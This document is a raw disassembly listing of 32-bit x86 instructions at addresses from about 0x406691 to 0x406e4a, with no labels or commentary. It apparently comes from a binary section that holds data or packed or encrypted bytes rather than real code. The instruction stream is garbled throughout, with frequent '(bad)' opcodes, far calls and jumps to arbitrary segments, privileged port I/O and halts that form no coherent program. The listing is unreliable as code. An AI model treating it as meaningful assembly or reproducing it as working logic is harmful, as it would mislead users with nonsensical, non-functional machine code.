  406691:	shr    BYTE PTR [esi-0x5d],0xd3
  406695:	xchg   esp,eax
  406696:	shl    ah,cl
  406698:	xchg   ebx,eax
  406699:	retf   0x7302
  40669c:	jmp    0x4066ac
  40669e:	jmp    0xbc61c9a1
  4066a3:	into   
  4066a4:	into   
  4066a5:	jmp    0x406654
  4066a7:	ss retf 0xd9dd
  4066ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066ac:	pop    edi
  4066ad:	jg     0x40666a
  4066af:	aas    
  4066b0:	jbe    0x40668e
  4066b2:	or     ch,BYTE PTR [eax-0x46a380ef]
  4066b8:	rol    BYTE PTR [edx-0x45],1
  4066bb:	mov    WORD PTR [edx+0x31cd3dfa],?
  4066c1:	xchg   ebp,eax
  4066c2:	neg    DWORD PTR [ebp-0x46cfeb3a]
  4066c8:	dec    ecx
  4066c9:	cmp    eax,0xffe13f01
  4066ce:	inc    ecx
  4066cf:	and    bl,BYTE PTR [edx+0x67]
  4066d2:	jns    0x40673a
  4066d4:	test   DWORD PTR [ebx+0x65],0x75e14fb9
  4066db:	adc    al,0xd5
  4066dd:	add    ebx,eax
  4066df:	cs mov bl,0xd3
  4066e2:	pop    ds
  4066e3:	adc    DWORD PTR [ebp-0x7d],edx
  4066e6:	lock int 0x30
  4066e9:	jp     0x406760
  4066eb:	and    dl,dl
  4066ed:	mov    esp,0x1694b641
  4066f2:	jb     0x4066b0
  4066f4:	cmp    BYTE PTR [edx-0x2],0x80
  4066f8:	jo     0x4066ff
  4066fa:	mov    ds:0xb043d766,eax
  4066ff:	lds    eax,FWORD PTR [ebp+ebp*2-0x7e]
  406703:	push   ebx
  406704:	lods   eax,DWORD PTR ds:[esi]
  406705:	adc    eax,0x74a23886
  40670a:	cmp    dl,BYTE PTR [ebx-0x11]
  40670d:	shl    DWORD PTR [eax-0x46],1
  406710:	lock inc edx
  406712:	adc    DWORD PTR [edx+0x7c],edi
  406715:	fidivr DWORD PTR [eax+esi*1+0x193ee18c]
  40671c:	xor    DWORD PTR [esi-0x27f39b4f],esp
  406722:	add    eax,0xc5186762
  406727:	adc    ecx,esi
  406729:	(bad)  
  40672a:	push   ebx
  40672b:	pop    ebx
  40672c:	daa    
  40672d:	mov    ah,0xe0
  40672f:	js     0x40677c
  406731:	mov    bl,0xab
  406733:	jmp    0x406721
  406735:	pop    ebx
  406736:	xcrypt-ctr (bad)
  406737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406738:	sbb    eax,0x303f329a
  40673d:	cld    
  40673e:	test   BYTE PTR [edi-0x38],ah
  406741:	push   esi
  406742:	shl    ebp,1
  406744:	(bad)  
  406745:	jle    0x4066db
  406747:	mov    eax,ds:0x595d8188
  40674c:	out    dx,eax
  40674d:	out    dx,eax
  40674e:	sbb    DWORD PTR [ebx],ebp
  406750:	ss mov ch,0x90
  406753:	sti    
  406754:	jle    0x406788
  406756:	addr16 mov ecx,esi
  406759:	dec    edi
  40675a:	ss xor al,0x7e
  40675d:	push   cs
  40675e:	fld    QWORD PTR [ebx]
  406760:	jmp    0xf784f8c5
  406765:	stos   DWORD PTR es:[edi],eax
  406766:	xor    DWORD PTR [edi],edi
  406768:	jg     0x406793
  40676a:	ret    0xb1dc
  40676d:	xor    edx,edx
  40676f:	loopne 0x40676c
  406771:	sub    al,0xe6
  406773:	inc    ebp
  406774:	rcr    BYTE PTR ds:0x7f8648f3,0x5
  40677b:	xor    eax,0xf196c268
  406780:	mov    ecx,esp
  406782:	mov    dl,0xee
  406784:	retf   
  406785:	inc    edx
  406786:	enter  0x9833,0x17
  40678a:	ficomp DWORD PTR [ebx+0x30ae001c]
  406790:	jecxz  0x406781
  406792:	loop   0x40676d
  406794:	loopne 0x40680d
  406796:	cmc    
  406797:	mov    dl,0xfb
  406799:	mov    edi,0x2302dd49
  40679e:	inc    ebx
  40679f:	jne    0x406747
  4067a1:	adc    eax,edx
  4067a3:	xor    al,BYTE PTR [esi+0x4]
  4067a6:	ins    DWORD PTR es:[edi],dx
  4067a7:	popa   
  4067a8:	bound  esp,QWORD PTR [ebx-0x6d]
  4067ab:	daa    
  4067ac:	mov    ah,0x75
  4067ae:	bnd jl 0x406740
  4067b1:	daa    
  4067b2:	or     ecx,DWORD PTR [eax]
  4067b4:	test   BYTE PTR [eax+0x4],ah
  4067b7:	test   eax,0xfe3ab17d
  4067bc:	cmc    
  4067bd:	xlat   BYTE PTR ds:[ebx]
  4067be:	jnp    0x4067c3
  4067c0:	or     ecx,DWORD PTR ds:0x55cfbc8
  4067c6:	cmp    DWORD PTR [esi],ebp
  4067c8:	mov    dh,0xa4
  4067ca:	vmread DWORD PTR [ebx-0x6e44ce4a],edi
  4067d1:	mov    eax,ds:0x688193af
  4067d6:	lds    eax,FWORD PTR [esi+ecx*2]
  4067d9:	repnz leave 
  4067db:	fadd   DWORD PTR ds:0xa05485ae
  4067e1:	ret    0xd2c
  4067e4:	sbb    al,0xca
  4067e6:	xchg   ebp,eax
  4067e7:	adc    al,0x3b
  4067e9:	fisttp QWORD PTR [edx+0x3c]
  4067ec:	scas   eax,DWORD PTR es:[edi]
  4067ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ee:	sub    eax,0x1ce02f78
  4067f3:	loopne 0x406865
  4067f5:	lods   eax,DWORD PTR ds:[esi]
  4067f6:	and    BYTE PTR [ebp-0x1],0x13
  4067fa:	pop    eax
  4067fb:	cmp    bh,BYTE PTR [ecx]
  4067fd:	ins    BYTE PTR es:[edi],dx
  4067fe:	xchg   edi,eax
  4067ff:	test   al,0xb4
  406801:	pop    ds
  406802:	push   esp
  406803:	lods   al,BYTE PTR ds:[esi]
  406804:	test   eax,0x39156b6b
  406809:	pop    ebx
  40680a:	jg     0x406805
  40680c:	inc    ebx
  40680d:	inc    edx
  40680e:	or     al,0xe2
  406810:	fsubr  QWORD PTR [ebx+0x7a]
  406813:	fs fcmove st,st(6)
  406816:	pop    ebp
  406817:	sub    BYTE PTR [edx+0x15f9640a],dl
  40681d:	ins    DWORD PTR es:[edi],dx
  40681e:	jmp    0x844634cf
  406823:	and    bh,cl
  406825:	dec    ecx
  406826:	mov    eax,ds:0xe6273569
  40682b:	xchg   ebp,eax
  40682c:	mov    cl,0xd8
  40682e:	mov    edx,0x6c94f14
  406833:	cs stc 
  406835:	xor    BYTE PTR [ebp+edi*2-0x6d],ch
  406839:	cmp    edi,DWORD PTR [ebp-0x57]
  40683c:	mov    DWORD PTR fs:[ebx+ecx*4-0x13],esi
  406841:	cwde   
  406842:	daa    
  406843:	mov    dh,0x49
  406845:	ret    0xd78d
  406848:	xor    ebx,0x52
  40684b:	call   0xe3d5:0x5e87d26e
  406852:	or     eax,0x19a796bd
  406857:	jecxz  0x40683c
  406859:	in     ax,dx
  40685b:	es mov edi,ecx
  40685e:	pop    ecx
  40685f:	stos   DWORD PTR es:[edi],eax
  406860:	push   ds
  406861:	div    ah
  406863:	arpl   bp,dx
  406865:	loope  0x4068d5
  406867:	mov    edi,0x351e665c
  40686c:	hlt    
  40686d:	sbb    BYTE PTR [eax+eax*2-0xf0f9a2c],dl
  406874:	pop    ebp
  406875:	cmp    eax,0x58c6bea6
  40687a:	pop    es
  40687b:	dec    edi
  40687c:	or     bl,ah
  40687e:	mov    gs,WORD PTR [edi]
  406880:	inc    esi
  406881:	retf   
  406882:	adc    ecx,edi
  406884:	pop    ss
  406885:	pop    ebx
  406886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406887:	lea    esi,[ebx-0x16]
  40688a:	lahf   
  40688b:	(bad)
  406890:	xor    cl,dl
  406892:	out    dx,al
  406893:	dec    esp
  406894:	push   ebx
  406895:	fdivr  st,st(3)
  406897:	pop    ds
  406898:	adc    DWORD PTR [eax+0x472891f8],eax
  40689e:	hlt    
  40689f:	jb     0x406853
  4068a1:	mov    esi,0xea8189c7
  4068a6:	pop    ebp
  4068a7:	call   0x9fd5:0x2fbb56f1
  4068ae:	icebp  
  4068af:	pop    ss
  4068b0:	mov    al,0xc0
  4068b2:	mov    dl,0x68
  4068b4:	test   BYTE PTR [edx-0x6f],ch
  4068b7:	dec    eax
  4068b8:	lods   eax,DWORD PTR ds:[esi]
  4068b9:	add    DWORD PTR [ecx],eax
  4068bb:	or     al,0x7f
  4068bd:	jle    0x40693b
  4068bf:	in     al,0xa2
  4068c1:	jg     0x4068f4
  4068c3:	jns    0x406940
  4068c5:	dec    esp
  4068c6:	retf   0x4ab4
  4068c9:	cmp    eax,0x6d13148b
  4068ce:	imul   edi,DWORD PTR [edx-0x25af4805],0xa
  4068d5:	imul   ecx,DWORD PTR [edx+0x586188da],0x32
  4068dc:	adc    eax,0x9696f606
  4068e1:	inc    ecx
  4068e2:	loopne 0x40690e
  4068e4:	mov    cl,0xa5
  4068e6:	or     bh,al
  4068e8:	retf   
  4068e9:	mov    BYTE PTR ds:0xe93ac995,bh
  4068ef:	fidivr WORD PTR [ebx]
  4068f1:	pusha  
  4068f2:	lods   al,BYTE PTR ds:[esi]
  4068f3:	hlt    
  4068f4:	xchg   ebp,eax
  4068f5:	jmp    0x7629:0x48e7dc56
  4068fc:	jmp    0x40691f
  4068fe:	inc    edi
  4068ff:	rcl    BYTE PTR [eax-0x693e5c02],0xbc
  406906:	xor    bl,al
  406908:	jle    0x406894
  40690a:	inc    ebp
  40690b:	shl    bh,0xc
  40690e:	adc    ch,dh
  406910:	jl     0x40698c
  406912:	in     al,0x92
  406914:	mov    edx,0x4b1d38c
  406919:	cmp    BYTE PTR [eax],bl
  40691b:	pop    edx
  40691c:	fcomp  st(3)
  40691e:	jl     0x4068f2
  406920:	scas   al,BYTE PTR es:[edi]
  406921:	out    dx,al
  406922:	(bad)  
  406924:	pop    ecx
  406925:	push   edi
  406926:	xchg   esp,eax
  406927:	or     DWORD PTR [ebx+0x157bc97d],ebx
  40692d:	stc    
  40692e:	sbb    edi,ecx
  406930:	xor    cl,dl
  406932:	push   ss
  406933:	in     al,dx
  406934:	and    al,0x5
  406936:	inc    esp
  406937:	les    edi,FWORD PTR [ebx]
  406939:	pop    ebp
  40693a:	inc    ebx
  40693b:	jmp    0xcfbc55aa
  406940:	nop
  406941:	retf   
  406942:	push   edi
  406943:	fadd   DWORD PTR [esi+0x35]
  406946:	dec    eax
  406947:	icebp  
  406948:	mov    ch,0x50
  40694a:	dec    ebx
  40694b:	pop    eax
  40694c:	bound  edi,QWORD PTR [ecx+0x7281cf7f]
  406952:	iret   
  406953:	ds call 0xfa58:0x567512f4
  40695b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40695c:	add    cl,BYTE PTR ds:0x1ed2f177
  406962:	repz sub ebx,DWORD PTR [ebx]
  406965:	loopne 0x4069af
  406967:	adc    BYTE PTR ds:0x982698e5,dl
  40696d:	(bad)  
  40696e:	xor    al,0x1e
  406970:	test   eax,0xce2ac431
  406975:	push   es
  406976:	sahf   
  406977:	mov    bl,0x4b
  406979:	ds test al,0x73
  40697c:	stos   BYTE PTR es:[edi],al
  40697d:	pushf  
  40697e:	(bad)  
  40697f:	addr16 ja 0x406912
  406982:	add    dh,BYTE PTR [ecx-0x23]
  406985:	mov    eax,0x9a0776f4
  40698a:	adc    BYTE PTR [ebx],cl
  40698c:	cld    
  40698d:	xor    DWORD PTR [ebx+0x2f],edi
  406990:	mov    ebp,0x86ff06bb
  406995:	dec    ebx
  406996:	push   0x49d32b01
  40699b:	fiadd  DWORD PTR [eax+0x54e39a9e]
  4069a1:	rsqrtps xmm4,XMMWORD PTR [ebx+0x611a0315]
  4069a8:	push   esp
  4069a9:	or     al,0xf4
  4069ab:	push   eax
  4069ac:	sub    eax,0x6d48f40e
  4069b1:	(bad)  
  4069b2:	in     al,dx
  4069b3:	popa   
  4069b4:	pusha  
  4069b5:	popa   
  4069b6:	add    ch,dh
  4069b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069b9:	cmp    BYTE PTR [ebx+0x42db21ce],bl
  4069bf:	cmp    dx,WORD PTR [ecx-0x50]
  4069c3:	pusha  
  4069c4:	pop    ecx
  4069c5:	jb     0x40697c
  4069c7:	(bad)  
  4069c8:	iret   
  4069c9:	mov    WORD PTR [edx-0x1f2d8e89],ss
  4069cf:	lahf   
  4069d0:	je     0x406a23
  4069d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069d3:	mov    bl,0x31
  4069d5:	inc    edi
  4069d6:	sahf   
  4069d7:	mov    ecx,0x27f5c1d6
  4069dc:	mov    ?,WORD PTR [ebx+0x55c6fcb1]
  4069e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069e3:	test   BYTE PTR [esi-0x7b03ce9e],bh
  4069e9:	jp     0x4069c3
  4069eb:	xchg   BYTE PTR [esi-0x39],bh
  4069ee:	inc    esi
  4069ef:	in     al,0xb8
  4069f1:	gs pop ebp
  4069f3:	ins    BYTE PTR es:[edi],dx
  4069f4:	fisttp QWORD PTR [esi-0x6240b9a7]
  4069fa:	push   es
  4069fb:	or     al,al
  4069fd:	imul   esi,DWORD PTR [ebx],0xffffffdb
  406a00:	xor    ah,BYTE PTR [edi+0x40f73034]
  406a06:	inc    edx
  406a08:	inc    edi
  406a09:	mov    esi,0x9b6525c7
  406a0e:	rol    BYTE PTR [ecx+0x6d],0x1
  406a12:	xor    DWORD PTR [edi+0x7ce38cf1],eax
  406a18:	jmp    0x2772a480
  406a1d:	mov    ds:0x903c4365,eax
  406a22:	cmc    
  406a23:	mov    ecx,0x6fe366ea
  406a28:	(bad)  
  406a29:	in     eax,dx
  406a2a:	ins    DWORD PTR es:[edi],dx
  406a2b:	cmp    al,0xa2
  406a2d:	repz cwde 
  406a2f:	jg     0x4069c5
  406a31:	sub    dh,bl
  406a33:	mov    BYTE PTR [edx],0x6d
  406a36:	or     al,0x3b
  406a38:	cwde   
  406a39:	sub    BYTE PTR [esi],0x13
  406a3c:	imul   ebx,ebp,0x4a
  406a3f:	or     DWORD PTR [ebx-0x1f],esp
  406a42:	dec    esp
  406a43:	sbb    al,0x6
  406a45:	jno    0x406a6f
  406a47:	fucomp st(2)
  406a49:	cmp    dh,dh
  406a4b:	add    edx,DWORD PTR [edx-0x1cd35135]
  406a51:	inc    edi
  406a52:	shl    esi,0xc2
  406a55:	sub    eax,0x7d327053
  406a5a:	stc    
  406a5b:	bound  edx,QWORD PTR [ebx-0x7d24eac]
  406a61:	int    0xea
  406a63:	sti    
  406a64:	inc    eax
  406a65:	cdq    
  406a66:	jecxz  0x406ac5
  406a68:	rcr    DWORD PTR [ecx],cl
  406a6a:	adc    eax,0xbf54ddac
  406a6f:	imul   edx,esp,0x3f
  406a72:	jmp    0xed9b165
  406a77:	inc    ecx
  406a78:	push   esp
  406a79:	mov    dh,bh
  406a7b:	stc    
  406a7c:	sbb    ebp,ecx
  406a7e:	cmp    cl,BYTE PTR [ecx]
  406a80:	add    BYTE PTR [esi],dl
  406a82:	fadd   QWORD PTR [edx+0x30]
  406a85:	ds add al,0x68
  406a88:	adc    ebp,ebp
  406a8a:	inc    esp
  406a8b:	shr    esi,cl
  406a8d:	jno    0x406a5d
  406a8f:	lods   eax,DWORD PTR ds:[esi]
  406a90:	and    bl,BYTE PTR [edi+0xfca9be5]
  406a96:	mov    bl,ah
  406a98:	stc    
  406a99:	mov    cl,0x68
  406a9b:	or     eax,0x695c379
  406aa0:	aam    0x49
  406aa2:	dec    ebp
  406aa3:	push   edi
  406aa4:	call   0xa5d0:0x66ebeee6
  406aab:	in     eax,dx
  406aac:	in     eax,dx
  406aad:	sbb    al,0x80
  406aaf:	jmp    0x13d6cc75
  406ab4:	addr16 daa 
  406ab6:	popa   
  406ab7:	lea    edi,[eax-0x3d]
  406aba:	push   0xfffffff9
  406abc:	aad    0xcf
  406abe:	cmp    al,0x22
  406ac0:	ins    BYTE PTR es:[edi],dx
  406ac1:	xor    al,0xf0
  406ac3:	add    eax,0x27ed537b
  406ac8:	inc    esp
  406ac9:	cld    
  406aca:	add    dh,al
  406acc:	mov    esp,0xce99a206
  406ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ad2:	and    eax,DWORD PTR [ecx-0x49186229]
  406ad8:	addr16 push esi
  406ada:	adc    esp,DWORD PTR [edi+0x754ead66]
  406ae0:	enter  0x6010,0x16
  406ae4:	jno    0x406b38
  406ae6:	push   esp
  406ae7:	popf   
  406ae8:	ss pop es
  406aea:	cld    
  406aeb:	or     eax,DWORD PTR [ebx-0x14]
  406aee:	xchg   ecx,eax
  406aef:	pop    ds
  406af0:	and    edi,DWORD PTR [ecx+0x4d1f0691]
  406af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406af7:	mov    gs,WORD PTR [ebp+0x400041a4]
  406afd:	sti    
  406afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aff:	xchg   edx,eax
  406b00:	xlat   BYTE PTR ds:[ebx]
  406b01:	jns    0x406b44
  406b03:	stos   DWORD PTR es:[edi],eax
  406b04:	xor    BYTE PTR [esi],bh
  406b06:	xor    al,0x60
  406b08:	daa    
  406b09:	call   0xd9b14e16
  406b0e:	add    eax,0x94eb9841
  406b13:	mul    BYTE PTR [ecx]
  406b15:	(bad)  
  406b16:	aam    0x97
  406b18:	arpl   WORD PTR [eax+esi*2-0x2],ax
  406b1c:	test   BYTE PTR [edi-0xb2a41f1],cl
  406b22:	mov    DWORD PTR ds:0x8d3d93a9,ecx
  406b28:	lock test edx,esi
  406b2b:	ret    
  406b2c:	daa    
  406b2d:	cmp    eax,0xdb15a8a8
  406b32:	aaa    
  406b33:	retf   
  406b34:	xor    DWORD PTR [ecx],0xb017af5b
  406b3a:	jmp    0x406af0
  406b3c:	xor    BYTE PTR [esi-0x1a1fa5b7],ah
  406b42:	or     BYTE PTR [ebp-0x1c],bh
  406b45:	push   DWORD PTR [ecx+esi*1+0x46e90a11]
  406b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b4d:	push   es
  406b4e:	daa    
  406b4f:	jg     0x406b6a
  406b51:	sbb    edx,DWORD PTR [ebp+0x172ff343]
  406b57:	outs   dx,DWORD PTR ds:[esi]
  406b58:	pop    edi
  406b59:	mov    ?,WORD PTR [ebx+esi*4]
  406b5c:	data16 ja 0x406b2f
  406b5f:	xchg   edi,eax
  406b60:	cli    
  406b61:	mov    bl,0x2c
  406b63:	stc    
  406b64:	mov    ebx,0xc4ec1749
  406b69:	add    DWORD PTR [ebp-0x7ec4718c],esp
  406b6f:	(bad)  
  406b70:	mov    ds:0xd0971f26,eax
  406b75:	fnstenv [edi+0x6f]
  406b78:	sbb    eax,0xad54a3a
  406b7d:	int    0x22
  406b7f:	pop    ebx
  406b80:	xor    eax,0xa29d844f
  406b85:	cmp    bh,BYTE PTR [esi-0x78989a31]
  406b8b:	ret    0xe983
  406b8e:	jnp    0x406b68
  406b90:	mov    edx,0xfedccb2c
  406b95:	or     eax,0xf9f0029f
  406b9a:	dec    ebp
  406b9b:	mov    al,ds:0x1d90bf20
  406ba0:	mov    edx,DWORD PTR [eax+edi*1-0x6f47484f]
  406ba7:	mov    ecx,0x6f25de02
  406bac:	ret    
  406bad:	out    0x85,al
  406baf:	pop    ds
  406bb0:	mov    cs,WORD PTR [eax-0x25]
  406bb3:	mov    eax,0x5f3af6aa
  406bb8:	pop    ds
  406bb9:	sub    al,0x81
  406bbb:	jmp    0xf68de98
  406bc0:	adc    esi,DWORD PTR [ebp+0x12]
  406bc3:	sahf   
  406bc4:	ret    
  406bc5:	fnstcw WORD PTR [ebx-0x50]
  406bc8:	and    BYTE PTR [ebx+eiz*2],bl
  406bcb:	pop    edi
  406bcc:	hlt    
  406bcd:	push   ds
  406bce:	pop    ecx
  406bcf:	xchg   ebp,ebp
  406bd1:	rol    BYTE PTR [esi],1
  406bd3:	clc    
  406bd4:	push   ebx
  406bd5:	pop    ds
  406bd6:	sub    bl,bl
  406bd8:	add    bl,BYTE PTR [eax+eax*1-0x6b]
  406bdc:	mov    dh,0x7d
  406bde:	retf   
  406bdf:	or     al,0x39
  406be1:	xchg   edx,eax
  406be2:	(bad)  
  406be3:	int3   
  406be4:	in     al,dx
  406be5:	bts    DWORD PTR [ebx+ebx*1],ecx
  406be9:	std    
  406bea:	frstor [esp+eax*8-0x42]
  406bee:	dec    ebp
  406bef:	xor    al,0x84
  406bf1:	std    
  406bf2:	add    ebx,DWORD PTR ds:0x1e68aab0
  406bf8:	xchg   bh,ah
  406bfa:	and    al,0x7f
  406bfc:	in     eax,0xd5
  406bfe:	pop    es
  406bff:	mov    edi,0x36b36740
  406c04:	mov    esi,0x57b79471
  406c09:	ja     0x406c2a
  406c0b:	call   FWORD PTR [edi+esi*1-0x3e]
  406c0f:	js     0x406c31
  406c11:	jecxz  0x406c1f
  406c13:	pop    ebp
  406c14:	bound  esp,QWORD PTR [edi-0xdb97b0e]
  406c1a:	(bad)  
  406c1b:	and    al,0xb6
  406c1d:	repnz adc eax,0x2f23d62a
  406c23:	push   edx
  406c24:	xchg   esp,eax
  406c25:	imul   ecx,DWORD PTR [ecx-0x5a],0xffffffe6
  406c29:	fbstp  TBYTE PTR [ebp+esi*1-0x19]
  406c2d:	xchg   BYTE PTR [ebp+0x3c6546d3],dl
  406c33:	fsub   DWORD PTR [eax+eax*2]
  406c37:	call   0xe33e:0xfbfd7b44
  406c3e:	pop    ss
  406c3f:	dec    esp
  406c40:	push   edi
  406c41:	push   edi
  406c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c43:	inc    edi
  406c44:	ret    
  406c45:	mov    ebp,0x8f86bd0b
  406c4a:	ja     0x406c9e
  406c4c:	mov    esi,DWORD PTR [esi-0x21468082]
  406c52:	js     0x406c98
  406c54:	add    BYTE PTR [edi-0x3a],ah
  406c57:	lds    edi,FWORD PTR [edi]
  406c59:	jl     0x406c00
  406c5b:	push   esi
  406c5c:	les    ebx,FWORD PTR [ebp-0x42]
  406c5f:	lock and ecx,DWORD PTR [edi]
  406c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c63:	and    al,0x3b
  406c65:	jae    0x406bf2
  406c67:	loop   0x406cab
  406c69:	jp     0x406c21
  406c6b:	jmp    0xa655:0xa64aef74
  406c72:	fimul  WORD PTR [ebp-0x12a887b6]
  406c78:	push   edx
  406c79:	push   edi
  406c7a:	mov    ch,0xfd
  406c7c:	dec    esi
  406c7d:	fdiv   st,st(7)
  406c7f:	ins    DWORD PTR es:[edi],dx
  406c80:	lahf   
  406c81:	sbb    ch,BYTE PTR [edx+0x1e2bf2c1]
  406c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c88:	xor    eax,0x7fbec380
  406c8d:	dec    edx
  406c8e:	lds    ebx,FWORD PTR [esi+edi*1]
  406c91:	repnz ins DWORD PTR es:[edi],dx
  406c93:	in     al,0xbb
  406c95:	fisttp WORD PTR [eax-0x28]
  406c98:	popf   
  406c99:	je     0x406cc9
  406c9b:	retf   0x1256
  406c9e:	pop    esi
  406c9f:	mov    edi,ebp
  406ca1:	jo     0x406d22
  406ca3:	xchg   ebp,eax
  406ca4:	push   cs
  406ca5:	aaa    
  406ca6:	aas    
  406ca7:	dec    eax
  406ca8:	scas   eax,DWORD PTR es:[edi]
  406ca9:	mov    dh,ah
  406cab:	xchg   edx,eax
  406cac:	leave  
  406cad:	(bad)  
  406cae:	mov    esi,0x5d30191e
  406cb3:	nop
  406cb4:	inc    esp
  406cb5:	inc    edx
  406cb6:	sbb    DWORD PTR [eax+0x77],ebp
  406cb9:	jg     0x406c44
  406cbb:	in     eax,dx
  406cbc:	out    dx,eax
  406cbd:	xor    eax,0x81e4d20c
  406cc3:	inc    ebp
  406cc4:	repnz lds esp,FWORD PTR [ebp+0x436be302]
  406ccb:	mov    cl,0x87
  406ccd:	push   esp
  406cce:	(bad)  
  406cd0:	mov    ecx,0xca7ebb81
  406cd5:	xor    BYTE PTR [eax-0x45],0xb2
  406cd9:	jno    0x406c8c
  406cdb:	clc    
  406cdc:	pop    ecx
  406cdd:	cmc    
  406cde:	retf   0x3979
  406ce1:	mov    dh,0x2b
  406ce3:	xor    ch,0x15
  406ce6:	ins    DWORD PTR es:[edi],dx
  406ce7:	jl     0x406c69
  406ce9:	add    al,0x14
  406ceb:	int    0xb2
  406ced:	ins    DWORD PTR es:[edi],dx
  406cee:	and    edx,DWORD PTR [ebp+0x2b]
  406cf1:	and    ecx,ebx
  406cf3:	xor    DWORD PTR [ebx],0xc194778d
  406cf9:	inc    edx
  406cfa:	cmp    bl,BYTE PTR [ecx]
  406cfc:	or     dh,cl
  406cfe:	sbb    al,0x77
  406d00:	mov    esi,DWORD PTR [ebx+0x35]
  406d03:	add    dh,0x44
  406d06:	data16 xchg si,ax
  406d09:	sub    cl,BYTE PTR [eax-0x1]
  406d0c:	xor    bh,BYTE PTR [edi+0x35]
  406d0f:	fild   QWORD PTR [eax-0x704f0771]
  406d15:	popf   
  406d16:	adc    al,0x13
  406d18:	std    
  406d19:	mov    edi,DWORD PTR ds:0x7c4d230f
  406d1f:	or     DWORD PTR [esi],0x3debaa5b
  406d25:	adc    al,0xf1
  406d27:	jmp    0xa608:0xc42ad648
  406d2e:	add    al,0x7
  406d30:	lahf   
  406d31:	or     ebx,edx
  406d33:	jge    0x406ced
  406d35:	aas    
  406d36:	stos   DWORD PTR es:[edi],eax
  406d37:	jnp    0x406d3e
  406d39:	mov    ebx,0xde09223c
  406d3e:	imul   ebx,DWORD PTR [edi-0x29c07886],0xb348cb2c
  406d48:	mov    esp,DWORD PTR [ebx+0x4f810cf0]
  406d4e:	arpl   WORD PTR [edi+0x7a4dd1d8],si
  406d54:	or     BYTE PTR ss:[ecx],ah
  406d57:	sahf   
  406d58:	jle    0x406dc5
  406d5a:	cs stos BYTE PTR es:[edi],al
  406d5c:	dec    ecx
  406d5d:	push   ebx
  406d5e:	inc    eax
  406d5f:	daa    
  406d60:	add    DWORD PTR [edi+0x11f2fd30],ebx
  406d66:	nop
  406d67:	inc    esp
  406d68:	imul   edi,esi,0xffffffcf
  406d6b:	stos   DWORD PTR es:[edi],eax
  406d6c:	mov    WORD PTR [ebx+0x3a201d7e],?
  406d72:	cwde   
  406d73:	or     eax,0x9f6886cb
  406d78:	cmp    ah,BYTE PTR [edx+0xb]
  406d7b:	mov    ds:0x314d6d01,al
  406d80:	sti    
  406d81:	ss or  eax,0x301d91a7
  406d87:	(bad)  
  406d88:	imul   eax,DWORD PTR [edx],0x48
  406d8b:	scas   al,BYTE PTR es:[edi]
  406d8c:	jb     0x406d9d
  406d8e:	iret   
  406d8f:	retf   0xb1bc
  406d92:	xchg   bl,cl
  406d94:	add    BYTE PTR [edi+0x54],0x51
  406d98:	outs   dx,DWORD PTR ds:[esi]
  406d99:	pop    ebp
  406d9a:	mov    ecx,0x72adc304
  406d9f:	cmp    al,0x8
  406da1:	stos   DWORD PTR es:[edi],eax
  406da2:	in     eax,0x18
  406da4:	hlt    
  406da5:	fadd   DWORD PTR [ebp-0x46]
  406da8:	fnstcw WORD PTR [esi+0x51]
  406dab:	hlt    
  406dac:	lock push ebx
  406dae:	or     eax,0x7cf7639c
  406db3:	sub    DWORD PTR [esi+0xc],ecx
  406db6:	adc    ebp,esi
  406db8:	cmc    
  406db9:	or     ecx,DWORD PTR [ecx]
  406dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dbc:	in     al,0x2a
  406dbe:	sbb    edi,esi
  406dc0:	mov    al,ds:0xbda9bf1b
  406dc5:	fistp  DWORD PTR [ebx-0x2445f3cb]
  406dcb:	lahf   
  406dcc:	loopne 0x406e37
  406dce:	mov    DWORD PTR [ecx-0x6d],esp
  406dd1:	xchg   edi,eax
  406dd2:	mov    WORD PTR [ecx-0x78],gs
  406dd5:	jp     0x406d61
  406dd7:	sub    DWORD PTR [eax+0xb],0x42157888
  406dde:	pop    edi
  406ddf:	sub    al,0x57
  406de1:	pop    esp
  406de2:	js     0x406d9f
  406de4:	dec    ebp
  406de5:	jl     0x406de4
  406de7:	(bad)  
  406de8:	ins    DWORD PTR es:[edi],dx
  406de9:	push   ds
  406dea:	xlat   BYTE PTR ds:[ebx]
  406deb:	ins    DWORD PTR es:[edi],dx
  406dec:	dec    BYTE PTR [esi-0x2]
  406def:	lds    esi,FWORD PTR [ecx-0x469beb0d]
  406df5:	sti    
  406df6:	(bad)  
  406df8:	lods   al,BYTE PTR ds:[esi]
  406df9:	xor    al,0xf
  406dfb:	lahf   
  406dfc:	outs   dx,DWORD PTR ds:[esi]
  406dfd:	je     0x406e2b
  406dff:	outs   dx,DWORD PTR ds:[esi]
  406e00:	repz dec esp
  406e02:	out    0x9c,eax
  406e04:	or     ebp,ebp
  406e06:	mov    edx,0x1d35889e
  406e0b:	in     eax,0x74
  406e0d:	adc    esp,edx
  406e0f:	lahf   
  406e10:	push   0xeabe861c
  406e15:	repz pop esi
  406e17:	test   eax,0x139c81da
  406e1c:	jns    0x406e08
  406e1e:	popa   
  406e1f:	ja     0x406dc2
  406e21:	cmp    esi,0xd7d91bf1
  406e27:	pushf  
  406e28:	mov    dl,0xd1
  406e2a:	xchg   esi,eax
  406e2b:	jb     0x406dfe
  406e2d:	push   ebp
  406e2e:	in     al,dx
  406e2f:	lock adc BYTE PTR fs:[ecx],0xb0
  406e34:	fldenv [eax]
  406e36:	jg     0x406e58
  406e38:	nop
  406e39:	mov    al,0x4
  406e3b:	jmp    0xd4a:0x9d4c65bb
  406e42:	cwde   
  406e43:	inc    esi
  406e44:	xor    al,0xfc
  406e46:	mov    edx,ds
  406e48:	jg     0x406de3
  406e4a:	daa    
